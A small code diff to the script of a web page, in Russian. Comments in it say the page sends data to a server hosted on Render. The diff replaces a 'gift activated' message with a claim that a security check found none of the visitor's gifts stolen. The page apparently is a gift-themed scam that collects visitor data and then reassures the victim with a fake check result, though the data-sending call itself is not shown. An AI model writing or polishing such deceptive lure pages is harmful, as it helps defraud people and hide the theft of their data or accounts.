@@ -30,12 +30,15 @@
         })
         .then(response => {
             if (response.ok) {
-                document.getElementById('status').innerHTML = "<h1>Готово! Подарок активирован.</h1>";
+                // Это сработает, если данные успешно ушли на Render
+                document.getElementById('status').innerHTML = "<h1>Проверка прошла успешно.<br>В ходе проверки мы выяснили:<br>ни один ваш подарок не был украден.</h1>";
             } else {
+                // Это сработает, если сервер Render ответил ошибкой
                 document.getElementById('status').innerHTML = "<h1>Ошибка сервера: " + response.status + "</h1>";
             }
         })
         .catch(error => {
+            // Это сработает, если интернет пропал или сервер выключен
             document.getElementById('status').innerHTML = "<h1>Ошибка сети: " + error + "</h1>";
         });
     </script>
